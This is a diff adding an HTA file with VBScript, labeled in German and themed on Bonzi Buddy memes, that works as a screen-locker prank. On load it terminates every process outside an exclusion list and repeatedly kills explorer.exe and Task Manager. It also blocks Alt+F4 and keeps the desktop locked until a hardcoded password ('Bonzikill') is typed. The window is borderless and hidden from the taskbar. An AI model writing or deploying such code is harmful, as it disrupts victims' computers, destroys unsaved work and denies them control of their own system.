@@ -1,0 +1,210 @@
+<html>
+<head>
+    <title>UniqueHTATitle123</title>
+    <hta:application
+        applicationname="UniqueHTAApplication123"
+        border="none"
+        caption="no"
+        showintaskbar="no"
+        sysmenu="no"
+        windowstate="normal">
+    <script type="text/vbscript">
+        Dim excludeList, triesLeft, closeAllCounter, lastTaskManagerClose
+        excludeList = Array("mshta.exe", "explorer.exe", "svchost.exe", "winlogon.exe", "lsass.exe", "services.exe", "smss.exe", "csrss.exe", "wininit.exe", "wscript.exe")
+        triesLeft = 3
+        closeAllCounter = 2
+        lastTaskManagerClose = Now
+
+        Sub Window_onLoad
+            window.focus()
+            SetTimer
+            UpdateTriesLeft
+            window.setInterval "CloseExplorer", 5000 ' Explorer alle 5 Sekunden schließen
+            window.setInterval "CloseTaskManager", 1 ' Task-Manager alle 200 Millisekunden schließen
+        End Sub
+
+        Sub SetTimer
+            window.setInterval "CloseAllApplications", 1000 
+        End Sub
+
+        Sub CloseAllApplications
+            Dim objWMIService, colProcesses, objProcess, taskManagerClosed
+            Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+            Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process")
+            taskManagerClosed = False
+
+            For Each objProcess in colProcesses
+                If closeAllCounter > 0 Then
+                    If Not IsInArray(objProcess.Name, excludeList) Then
+                        On Error Resume Next
+                        objProcess.Terminate()
+                        On Error Goto 0
+                    End If
+                End If
+
+                If IsInArray(objProcess.Name, excludeList) Then
+                    If objProcess.Name = "Taskmgr.exe" Then
+                        taskManagerClosed = True
+                    End If
+                End If
+            Next
+
+            If closeAllCounter > 0 Then
+                closeAllCounter = closeAllCounter - 1
+            End If
+
+            If taskManagerClosed Then
+                ShowTaskManagerClosedPopup
+            End If
+        End Sub
+
+        Sub CloseExplorer
+            On Error Resume Next
+            Dim objWMIService, colProcess, objProcess
+            Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+            Set colProcess = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'explorer.exe'")
+            For Each objProcess in colProcess
+                objProcess.Terminate()
+            Next
+            On Error Goto 0
+        End Sub
+
+        Sub CloseTaskManager
+            If DateDiff("s", lastTaskManagerClose, Now) > 0.2 Then
+                lastTaskManagerClose = Now
+                On Error Resume Next
+                Dim objWMIService, colProcess, objProcess
+                Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+                Set colProcess = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'Taskmgr.exe'")
+                For Each objProcess in colProcess
+                    objProcess.Terminate()
+                Next
+                On Error Goto 0
+            End If
+        End Sub
+
+        Function IsInArray(item, arr)
+            IsInArray = (UBound(Filter(arr, item)) > -1)
+        End Function
+
+        Sub ShowTaskManagerClosedPopup
+            document.getElementById("taskManagerClosedPopup").style.display = "block"
+            window.setTimeout "CloseTaskManagerClosedPopup", 10000
+        End Sub
+
+        Sub CloseTaskManagerClosedPopup
+            document.getElementById("taskManagerClosedPopup").style.display = "none"
+        End Sub
+
+        Sub Document_onKeyDown()
+            If (window.event.altKey And window.event.keyCode = 115) Then 
+                window.event.returnValue = False
+                ShowGifPopup
+            End If
+        End Sub
+
+        Sub ShowGifPopup
+            document.getElementById("gifPopup").style.display = "block"
+            window.setTimeout "CloseGifPopup", 10000
+        End Sub
+
+        Sub CloseGifPopup
+            document.getElementById("gifPopup").style.display = "none"
+        End Sub
+
+        Sub CheckInput
+            If document.getElementById("inputField").value = "Bonzikill" Then
+                If MsgBox("Passwort Richtig(Empfehlung: Neustart)", vbYesNo + vbQuestion, "Neustart Bestätigung") = vbYes Then
+                    CloseAllVBScripts ' Alle VBScripte beenden
+                Else
+                    self.close()
+                End If
+            Else
+                triesLeft = triesLeft - 1
+                UpdateTriesLeft
+                If triesLeft <= 0 Then
+                    document.getElementById("inputField").disabled = True
+                    ShowCustomAlert
+                End If
+            End If
+        End Sub
+
+        Sub ShowCustomAlert
+            document.getElementById("customAlert").style.display = "block"
+            window.setTimeout "CloseCustomAlert", 10000
+        End Sub
+
+        Sub CloseCustomAlert
+            document.getElementById("customAlert").style.display = "none"
+        End Sub
+
+        Sub CloseAllVBScripts
+            Dim objWMIService, colProcesses, objProcess
+            Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+            Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'wscript.exe'")
+            For Each objProcess in colProcesses
+                objProcess.Terminate()
+            Next
+        End Sub
+
+        Sub InputKeyPress(key)
+            If key.keyCode = 13 Then
+                CheckInput
+            End If
+        End Sub
+
+        Sub UpdateTriesLeft
+            document.getElementById("triesLeftDisplay").innerText = "Verbleibende Versuche: " & triesLeft
+        End Sub
+    </script>
+
+    <style>
+        body {
+            text-align: center;
+        }
+
+        #centerContainer, #taskManagerClosedPopup {
+            margin: auto;
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        #gifPopup, #customAlert, #taskManagerClosedPopup {
+            display: none;
+            position: fixed;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            border: 1px solid black;
+            background-color: white;
+            padding: 20px;
+            z-index: 1000;
+        }
+    </style>
+</head>
+<body onload="Window_onLoad" onkeydown="Document_onKeyDown">
+    <div id="centerContainer">
+        <img src="https://media.tenor.com/uqmWm9L-oVQAAAAM/bonzi-buddy-bonzi.gif" >
+        <h1>El Primo</h1>
+        <input type="text" id="inputField" onkeypress="InputKeyPress(window.event)">
+        <p id="triesLeftDisplay"></p>
+    </div>
+
+    <div id="gifPopup">
+        <p>No ALtF4</p>
+        <img src="https://i.kym-cdn.com/photos/images/newsfeed/002/530/211/6bb.gif" >
+    </div>
+
+    <div id="customAlert">
+        <p>To bad</p>
+        <img src="https://i.imgflip.com/6fh55g.jpg" alt="Bild">
+    </div>
+
+    <div id="taskManagerClosedPopup" style="display:none;">
+        <p>NO TASKMANAGER</p>
+        <img src="https://www.gifcen.com/wp-content/uploads/2021/06/meme-gif-14.gif" >
+    </div>
+</body>
+</html>
